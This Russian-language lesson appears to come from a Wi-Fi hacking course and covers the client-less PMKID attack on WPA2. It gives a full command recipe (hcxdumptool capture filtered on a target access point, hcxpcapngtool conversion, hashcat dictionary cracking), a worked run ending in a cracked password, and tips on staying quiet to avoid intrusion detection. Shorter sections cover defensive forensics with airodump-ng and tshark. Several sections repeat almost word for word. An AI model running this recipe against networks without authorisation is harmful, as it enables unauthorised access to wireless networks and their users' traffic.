## Вопрос, с которого всё начинается

Обычная атака на WPA2 требует клиента: он должен подключиться, чтобы появилось рукопожатие. А если точка стоит одна, ночью, без клиентов? Есть ли способ получить материал для перебора, не дожидаясь никого? Да — **PMKID**, client-less атака.

## Наш пример: одинокая точка `warehouse`

Точка `warehouse` работает круглосуточно, клиентов в эфире нет. Мы хотим получить её материал, не создавая шума.

## Шаг 1: откуда берётся PMKID

Когда точка поддерживает «PMKID в RSN IE», она может включить в первый EAPOL-кадр значение:

```
PMKID = HMAC-SHA1-128(PMK, "PMK Name" || AP-MAC || STA-MAC)
```

PMK зависит от пароля и SSID. Значит, PMKID — это функция пароля. Атакующему достаточно **ассоциироваться** с точкой (даже без пароля) и прочитать этот кадр: клиент сети не нужен вообще.

## Шаг 2: hcxdumptool в режиме client-less

`hcxdumptool` шлёт ассоциационные кадры и собирает ответы:

```
$ hcxdumptool -i wlan0 -o wh.pcapng --enable_status=1 --filterlist_ap=warehouse
[15:10:02] aa:bb:cc:00:11:22 -> PMKID: 4f2b...d9 (warehouse)
```

Строка `PMKID:` означает успех. Никакой деаутентификации — только пассивный запрос, который точка отдаёт добровольно.

## Шаг 3: конвертация и перебор

```
$ hcxpcapngtool -o wh.hc22000 wh.pcapng
$ hashcat -m 22000 wh.hc22000 rockyou.txt
```

Дальше — как в прошлом уроке. Важно: если точка не поддерживает PMKID, метод не сработает, и придётся ждать клиента.

## Шаг 4: форензика эфира — пассивный сбор

Иногда цель — не взлом, а **анализ**: кто с кем говорил, какие точки появлялись, был ли злоумышленник. Здесь оружие — пассивная запись. `airodump-ng` пишет все точки и клиентов:

```
$ airodump-ng wlan0
BSSID              CH  ENC   ESSID
AA:BB:CC:00:11:22   6  WPA2  warehouse
DE:AD:BE:EF:00:99   6  OPN   FreeWiFi          # подозрительно: открытая в том же месте
```

Появление открытой `FreeWiFi` рядом с корпоративной `warehouse` — типичный признак Evil Twin. В отчёте фиксируют BSSID, каналы и время появления.

## Шаг 5: разбор дампа кадров

Форензик-анализ делают в `tshark`/`wireshark`. Например, найти все deauth-кадры (признак атаки):

```
$ tshark -r incident.pcap -Y 'wlan.fc.type_subtype == 12' -T fields -e wlan.sa -e wlan.da
66:77:88:99:aa:bb  ff:ff:ff:ff:ff:ff
66:77:88:99:aa:bb  00:11:22:33:44:55
```

Серия deauth от одного источника на broadcast — почти наверняка атака или сбойный драйвер. Собираем таймлайн: когда началось, какой источник, какие клиенты пострадали.

## Если не сработало

- Точка без поддержки PMKID → возвращаемся к рукопожатию с клиентом.
- PMF включён → защита от подделки кадров, client-less может не пройти.
- Нужен пассивный режим → уберите ассоциационные кадры, слушайте только (`--disable_client_attacks`).

## Что мы теперь знаем

- PMKID — функция PMK, отдаваемая точкой при ассоциации; клиент не нужен.
- `hcxdumptool` собирает PMKID, `hcxpcapngtool` — конвертирует.
- Форензика эфира — это пассивная запись, анализ BSSID/каналов и поиск deauth.
- Открытая точка рядом с корпоративной — признак Evil Twin.

## Почему PMKID ломает старое правило «нужен клиент»

Долгое время взлом WPA2 требовал рукопожатия, а значит — активного клиента. В 2018 году Jens Steube показал: некоторые точки отдают в первом EAPOL-кадре **PMKID** — значение, вычислимое из PMK. Это меняет всё: клиент не нужен, deauth не нужен, достаточно **ассоциироваться** с точкой.

```
PMKID = HMAC-SHA1-128(PMK, "PMK Name" || AP-MAC || STA-MAC)
```

`AP-MAC` — адрес точки, `STA-MAC` — наш собственный (мы его знаем, ведь это наш адаптер). Значит, PMKID зависит только от пароля (через PMK) и от SSID. Полный аналог рукопожатия по «стоимости перебора», но добывается без клиента и без шума.

## Почему это тише, чем deauth

Deauth-атака видна в эфире: серия кадров от точки, которой их никто не слал. WIDS это ловит. PMKID-атака — это обычная ассоциация, каких в эфире тысячи: клиент пришёл, точка ответила. Единственное отличие — мы не завершаем подключение паролем. Для системы это выглядит как несостоявшееся подключение, а не как атака.

Именно поэтому PMKID-метод называют **client-less** и **quiet**. В отчёте это фиксируют как «атака без нарушения доступности»: мы ничего не отключали, никого не «выкидывали» из сети.

## Работа с hcxdumptool и фильтрами

`hcxdumptool` шлёт ассоциационные запросы и собирает ответы. Чтобы не собирать «всё подряд», задают фильтр по BSSID цели:

```
$ hcxdumptool -i wlan0 -o wh.pcapng --filterlist_ap=aa:bb:cc:00:11:22 --filtermode=2
$ hcxdumptool -i wlan0 -o wh.pcapng --enable_status=1
[15:10:02] aa:bb:cc:00:11:22 -> PMKID: 4f2b...d9
```

Строка `PMKID:` — успех. Дальше конвертация в формат hashcat и перебор — точно так же, как с рукопожатием:

```
$ hcxpcapngtool -o wh.hc22000 wh.pcapng
$ hashcat -m 22000 wh.hc22000 rockyou.txt
```

Важно: формат `22000` один и для PMKID, и для EAPOL, поэтому инструментарий общий.

## Ограничение: не все точки отдают PMKID

PMKID в msg1 отдают далеко не все вендоры. Если точка не поддерживает эту опцию, метод не сработает — придётся вернуться к рукопожатию с клиентом. Проверить можно по первому кадру: наличие RSN PMKID в EAPOL msg1.

```
$ tshark -r wh.pcapng -Y 'eapol' -T fields -e wlan_rsna_eapol.keydes.pmkid | head -1
4f2b...d9
```

Пустое поле → PMKID нет. Иногда помогает включить `--disable_client_attacks` и атаковать только точку, но если опция не поддерживается на стороне AP — пути нет.

## Форензика эфира: PMKID как артефакт

PMKID — не только атака, но и **след**. Когда точка отдаёт PMKID всем, кто ассоциируется, в дампе остаётся запись: BSSID, наш MAC, время. При разборе инцидента аналитик ищет аномальные ассоциации: один MAC за короткое время «стучался» к десяткам BSSID — это профиль сканера/атакующего.

```
$ tshark -r incident.pcapng -Y 'eapol' -T fields -e wlan.sa -e wlan.bssid | sort | uniq -c | sort -rn
    37  66:77:88:99:aa:bb  aa:bb:cc:00:11:22
    29  66:77:88:99:aa:bb  de:ad:be:ef:00:99
    22  66:77:88:99:aa:bb  aa:bb:cc:11:22:33
```

Один источник, много точек, все — EAPOL msg1 без завершения — типичный client-less сбор. Такой паттерн стоит фиксировать как индикатор компрометации эфира.

## Полный прогон: «тихий» захват на одинокой точке

Точка `warehouse` работает ночью, клиентов нет. Задача — получить материал, не создавая шума.

```
$ hcxdumptool -i wlan0 -o wh.pcapng --enable_status=1 --filterlist_ap=aa:bb:cc:00:11:22
[15:10:02] aa:bb:cc:00:11:22 -> PMKID: 4f2b...d9
[15:10:02] no client associated

$ hcxpcapngtool -o wh.hc22000 wh.pcapng
$ hashcat -m 22000 wh.hc22000 rockyou.txt
STATUS  Cracked
PASSWORD: warehouse2024
```

Ни одного deauth, ни одного отключённого клиента — а пароль у нас есть.

## Если не сработало

- **Точка не отдаёт PMKID** → возврат к рукопожатию с клиентом (предыдущий урок).
- **PMF включён** → client-less может не пройти; нужен пассивный захват реального рукопожатия.
- **Слишком шумно** → убери ассоциационные атаки, слушай только (`--disable_client_attacks`).
- **PMKID есть, но перебор не идёт** → проверь, что конвертация в `hc22000` прошла и в строке есть SSID.

## Что мы теперь знаем

- PMKID = HMAC(PMK, ...) — функция пароля, отдаваемая точкой при ассоциации.
- Клиент не нужен: это client-less атака, тише deauth.
- `hcxdumptool` собирает, `hcxpcapngtool` конвертирует, `hashcat -m 22000` перебирает.
- Не все точки отдают PMKID — есть ограничение.
- В форензике аномальные ассоциации одного MAC к многим BSSID — индикатор client-less сбора.

## Инструменты вокруг: hcxtools

PMKID-путь держится на пакете **hcxtools**: `hcxdumptool` собирает, `hcxpcapngtool` конвертирует и показывает статистику, `hcxhashtool` фильтрует. Полезная проверка — что в дампе вообще есть материал:

```
$ hcxpcapngtool -o out.hc22000 -E essidlist wh.pcapng
$ hcxhashtool -i out.hc22000 --info=stdout
PMKID list
  aa:bb:cc:00:11:22  warehouse
```

Если `hcxhashtool` не показывает ни PMKID, ни EAPOL, дамп пустой — перебор бессмысленен. Ещё `hcxdumptool` умеет `--disable_deauthentication`, чтобы гарантированно не трогать клиентов: тогда метод становится полностью пассивным.

## Частые грабли

- **Смешивание режимов** → `--filterlist_ap` без `--filtermode=2` фильтрует не то; проверяй синтаксис версии.
- **Адаптер без injection** → ассоциационные кадры не уйдут, PMKID не придёт.
- **Забыл SSID** → в `hc22000` без ESSID перебор не стартует; добавляй `-E`.
- **Один дамп — один PMKID** → для нескольких точек собирай отдельные записи.
- **PMF** → client-less может не пройти, проверь защиту кадров заранее.

## PMKID против рукопожатия: когда что

Оба метода дают один и тот же результат — материал для офлайн-перебора, — но добываются по-разному. Выбор зависит от обстановки.

| Критерий | Рукопожатие | PMKID |
|---|---|---|
| Нужен клиент | да | нет |
| Нужен deauth | обычно да | нет |
| Шумность | средняя/высокая | низкая |
| Поддержка точкой | почти всегда | не всеми вендорами |
| Артефакт в эфире | серия deauth | ассоциация без завершения |
| Совместимость с hashcat | `-m 22000` | `-m 22000` |

Практическое правило: есть клиенты и можно шуметь — лови рукопожатие; сеть пустая или важна тишина — пробуй PMKID. Если PMKID не отдаётся, откат к рукопожатию занимает минуты.
